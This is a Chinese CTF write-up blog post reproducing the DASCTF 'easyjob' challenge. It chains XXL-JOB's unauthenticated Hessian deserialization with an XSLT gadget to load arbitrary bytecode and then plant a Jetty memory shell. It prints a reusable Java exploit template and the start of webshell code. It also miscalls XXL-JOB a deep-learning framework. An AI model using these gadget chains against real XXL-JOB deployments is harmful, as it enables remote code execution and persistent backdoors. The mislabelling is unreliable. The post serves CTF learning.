<!DOCTYPE html>
<html lang="en">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  <link rel="icon" href="/images/favicon.ico">
  
  <title>dasctf暑期挑战赛easyjob复现 | Err0r233</title>
  <meta name="author" content="Err0r2333" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="Web" />
  
  <meta name="description" content="这次java意外地能查到资料.jpg，然后以为得用jndi打，就不是很想做。哎，没想到不出网，淦。还有个很几把神经的原因就是十个靶机我全都打不开，摆了">
<meta property="og:type" content="article">
<meta property="og:title" content="dasctf暑期挑战赛easyjob复现">
<meta property="og:url" content="http://example.com/posts/52077.html">
<meta property="og:site_name" content="Err0r233">
<meta property="og:description" content="这次java意外地能查到资料.jpg，然后以为得用jndi打，就不是很想做。哎，没想到不出网，淦。还有个很几把神经的原因就是十个靶机我全都打不开，摆了">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/favicon.ico">
<meta property="article:published_time" content="2024-07-23T08:34:18.000Z">
<meta property="article:modified_time" content="2024-08-11T04:43:57.935Z">
<meta property="article:author" content="Err0r2333">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/favicon.ico">
  
  <!-- 站点验证相关 -->
  
    
    
    
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
  
    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
    <script src="/js/kr-dark.min.js"></script>
  
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
  
  
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
  
  
    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
  
  
    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
  
  <!-- 不得不预先加载的一些JS文件 -->
  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
  
    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
  
  
  <style>
    
      .kratos-cover.kratos-cover-2 {
        background-image: url('/images/banner3.png');
      }
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('/images/Iceartory.jpg');
        }
      }
    
  </style>
  
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
</head>



    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    
                                    
                                        
                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
                                        
                                    
                                        
                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
                                        
                                    
                                        
                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
                                        
                                    
                                        
                                            <li>
                                                <a><i class="fa fa-link"></i>链接</a>
                                                <ul class="sub-menu">
                                                    
                                                        
                                                    
                                                </ul>
                                            </li>
                                        
                                    
                                
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">Err0r233</a></div>
                    <div class="nav-toggle">
                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>Err0r233</h2> <br />
                        <span>Err0r233的个人博客</span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">
                    

        

        

            <section class="col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    
    <link itemprop="mainEntityOfPage" href="http://example.com/posts/52077.html">
    <div class="kratos-hentry kratos-post-inner clearfix">
        <header class="kratos-entry-header">
            
                <h1 class="kratos-entry-title text-center" itemprop="name headline">dasctf暑期挑战赛easyjob复现</h1>
            
            
            <ul class="kratos-post-meta text-center">
                <li><time datetime="2024-07-23T08:34:18.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-07-23</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
                </li>
                <li>
                    <i class="fa fa-edit"></i> 
                    
                    
                        ~40.22K
                    
                    字
                </li>
                
                    <li id="/posts/52077.html" class="leancloud_visitors" data-flag-title="dasctf暑期挑战赛easyjob复现">
                        <i class="fa fa-eye"></i>
                        <span class="leancloud-visitors-count"> </span> 次阅读
                    </li>
                    
                
            </ul>
        </header>
        <div class="kratos-post-content">
            
            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                <div class="icon"><i class="fa fa-warning"></i></div>
                <div class="text"><p>本文最后编辑于 <time datetime="1723351437935"></time> 前，其中的内容可能需要更新。</p></div>
            </div>
            
            
            
            <hr />
            <div itemprop="articleBody"><p>这次java意外地能查到资料.jpg，然后以为得用jndi打，就不是很想做。哎，没想到不出网，淦。还有个很几把神经的原因就是十个靶机我全都打不开，摆了</p>
<span id="more"></span>
<h1><span id="jadx怎么说"> jadx怎么说</span></h1>
<p>老样子，打开jadx反编译附件，发现是xxl-job，不是常规的序列化反序列化。</p>
<p>欸，去搜一下是什么东西，发现他是一个深度学习的框架，可以类比成cms之类的玩意。既然是一个现有的框架，那就直接搜搜他的漏洞：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_59598029/article/details/138341775">XXL-JOB executor 未授权访问漏洞-CSDN博客</a></p>
<p>刚开始是找到这个，众所周知csdn的东西不是很靠谱，然后就去找了另外一个：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13899?time__1311=GqmxnD0D2Dci3GNeWxUgO7Qc7DjxYv33x">XXL-JOB在真实攻防下的总结 - 先知社区 (aliyun.com)</a></p>
<p>是的，在这里就已经能看见wp里的答案了</p>
<img src="/posts/52077/1.png" class title="awa">
<img src="/posts/52077/2.png" class title="awa">
<p>当时没怎么细看，可惜了</p>
<p>然后再找了一个：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ph4nt0mer/p/13913252.html">xxl-job-admin反序列化漏洞</a></p>
<p>确定就是hessian+xxl-job的组合拳。并且都是这个api的未授权洞。</p>
<p>但是他们的打法都是根据出网的jndi打的，本人jndi这方面比较垃圾，就不是很想做。。。</p>
<p>但是它确实不出网。那就来研究不出网的打法：</p>
<h1><span id="不出网怎么打"> 不出网怎么打</span></h1>
<p>就是利用xslt去注入内存马：</p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2592">记一次曲折的XXL-JOB API Hessian反序列化到Getshell</a></p>
<p>其中介绍到的xslt的gadget在jdk8下通杀，且为高可用payload。利用到了<code>com.sun.org.apache.xalan.internal.xslt.Process</code>的<code>_main</code>方法去加载恶意的xslt文件，我们可以在xslt文件内部执行任意语句，并且不受限。</p>
<p>给出一个xslt的模板：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:stylesheet version=<span class="string">&quot;1.0&quot;</span> xmlns:xsl=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="line">                xmlns:b64=<span class="string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span><br><span class="line">                xmlns:ob=<span class="string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span><br><span class="line">                xmlns:th=<span class="string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span><br><span class="line">                xmlns:ru=<span class="string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span><br><span class="line">&gt;</span><br><span class="line">    &lt;xsl:template match=<span class="string">&quot;/&quot;</span>&gt;</span><br><span class="line">        &lt;xsl:variable name=<span class="string">&quot;bs&quot;</span> select=<span class="string">&quot;b64:decodeBuffer(b64:new(),&#x27;base64&#x27;)&quot;</span>/&gt;</span><br><span class="line">        &lt;xsl:variable name=<span class="string">&quot;cl&quot;</span> select=<span class="string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span><br><span class="line">        &lt;xsl:variable name=<span class="string">&quot;rce&quot;</span> select=<span class="string">&quot;ru:defineClass(&#x27;classname&#x27;,$bs,$cl)&quot;</span>/&gt;</span><br><span class="line">        &lt;xsl:value-of select=<span class="string">&quot;$rce&quot;</span>/&gt;</span><br><span class="line">    &lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure>
<p>Nookipop师傅的文件讲的很清楚了，走两次反序列化：</p>
<p>这是第一次，写入xslt的payload：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianProxyLVFileWrite</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Pkcs9可以换成MimeTypeParameterList</span></span><br><span class="line">        <span class="type">PKCS9Attributes</span> <span class="variable">pkcs9Attributes</span> <span class="operator">=</span> SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        <span class="comment">//PKCS9Attribute.EMAIL_ADDRESS_OID 是固定的，调试流程可以看到逻辑</span></span><br><span class="line">        <span class="comment">//去修改需要读取的文件，和写入的文件名，实例中是读取1.txt写入pwned.txt</span></span><br><span class="line">        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="string">&quot;writeBytesToFilename&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/tmp/1.xslt&quot;</span>,SerializeUtils.getFileBytes(<span class="string">&quot;E:\\payload.xslt&quot;</span>)&#125;));</span><br><span class="line">        SerializeUtils.setFieldValue(pkcs9Attributes,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOut);</span><br><span class="line">        fileOut.write(<span class="number">67</span>);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject(pkcs9Attributes);</span><br><span class="line">        out.close();</span><br><span class="line">        fileOut.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是第二次，执行命令的payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Pkcs9可以换成MimeTypeParameterList</span></span><br><span class="line">        <span class="type">PKCS9Attributes</span> <span class="variable">pkcs9Attributes</span> <span class="operator">=</span> SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="string">&quot;_main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;-XT&quot;</span>, <span class="string">&quot;-XSL&quot;</span>, <span class="string">&quot;E:\\payload.xslt&quot;</span>&#125;&#125;));</span><br><span class="line">        SerializeUtils.setFieldValue(pkcs9Attributes,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOut);</span><br><span class="line">        fileOut.write(<span class="number">67</span>);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject(pkcs9Attributes);</span><br><span class="line">        out.close();</span><br><span class="line">        fileOut.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>改造一下改造回我们用的<code>MimeTypeParameterList</code>即可</p>
<p>给大家提供一个板子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Err0r233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.MimeTypeParameterList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xsltTemplate</span> <span class="operator">=</span> <span class="string">&quot;&lt;xsl:stylesheet version=\&quot;1.0\&quot; xmlns:xsl=\&quot;http://www.w3.org/1999/XSL/Transform\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                xmlns:b64=\&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                xmlns:ob=\&quot;http://xml.apache.org/xalan/java/java.lang.Object\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                xmlns:th=\&quot;http://xml.apache.org/xalan/java/java.lang.Thread\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                xmlns:ru=\&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;xsl:template match=\&quot;/\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;xsl:variable name=\&quot;bs\&quot; select=\&quot;b64:decodeBuffer(b64:new(),&#x27;base64&#x27;)\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;xsl:variable name=\&quot;cl\&quot; select=\&quot;th:getContextClassLoader(th:currentThread())\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;xsl:variable name=\&quot;rce\&quot; select=\&quot;ru:defineClass(&#x27;classname&#x27;,$bs,$cl)\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;xsl:value-of select=\&quot;$rce\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/xsl:template&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/xsl:stylesheet&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Code</span> <span class="operator">=</span> <span class="string">&quot;There is a base64_template code here&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xslt</span> <span class="operator">=</span> xsltTemplate.replace(<span class="string">&quot;base64&quot;</span>, base64Code);</span><br><span class="line">        xslt = xslt.replace(<span class="string">&quot;classname&quot;</span>, <span class="string">&quot;any_classname_here&quot;</span>);</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="string">&quot;writeBytesToFilename&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;1.xslt&quot;</span>,xslt.getBytes()&#125;);</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;aaa&quot;</span>, swingLazyValue);</span><br><span class="line">        <span class="type">MimeTypeParameterList</span> <span class="variable">mimeTypeParameterList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">        SetValue(mimeTypeParameterList, <span class="string">&quot;parameters&quot;</span>, uiDefaults);</span><br><span class="line">        deser(ser(mimeTypeParameterList));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clz.getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">ser</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        <span class="comment">//允许反序列化NonSerializable</span></span><br><span class="line">        hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发expect:</span></span><br><span class="line">        baos.write(<span class="number">67</span>);</span><br><span class="line">        hessian2Output.writeObject(obj);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deser</span><span class="params">(String b64String)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(b64String));</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看见执行之后确实有一个<code>1.xslt</code></p>
<img src="/posts/52077/3.png" class title="awa">
<p>内容也变成了我们需要改掉的内容</p>
<p>ok了，这样就可以做第二步的rce，只用把<code>SwingLazyValue</code>改成这样就行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue(&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;, &quot;_main&quot;, new Object[]&#123;new String[]&#123;&quot;-XT&quot;, &quot;-XSL&quot;, &quot;xslt路径&quot;&#125;&#125;));</span><br></pre></td></tr></table></figure>
<h1><span id="复现"> 复现</span></h1>
<p>题目环境是不出网的，所以我们得找到一个适合的内存马，找内存马这事情得看框架。很明显他是一个jetty框架，所以说直接找一下jetty内存马，这个内存马找不到，只能抄一下wp了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xxl.job.core;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.eclipse.jetty.server.*;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.jetty.server.handler.AbstractHandler;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.jetty.server.handler.HandlerCollection;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> 